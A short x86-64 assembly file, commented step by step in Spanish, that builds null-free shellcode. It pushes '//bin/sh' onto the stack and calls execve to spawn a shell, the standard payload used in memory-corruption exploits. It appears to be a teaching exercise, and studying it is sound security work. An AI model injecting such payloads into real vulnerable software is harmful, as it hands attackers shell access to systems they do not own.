section .text
	global _start

_start:
	; 1. Limpiamos RAX y preparamos el fin de cadena (NULL)
	xor rax, rax
	push rax		; Metemos un 0 al stack

	; 2. Metemos "//bin/sh" (8 bytes exactos, sin nulos)
	mov rbx, 0x68732f6e69622f2f
	push rbx		; Ahora RSP apunta a "//bin/sh\0"

	; 3. Configuramos los registros para execve (syscall 59)
	mov rdi, rsp		; RDI = Puntero a la cadena (syscall 59)
	xor rsi, rsi		; RSI = NULL (Sin argumentos extra)
	xor rdx, rdx		; RDX = NULL (Sin variables de entorno)

	; 4. LLamada al Kernel
	add al, 59		; RAX = 59 (AL para evitar ceros)
	syscall
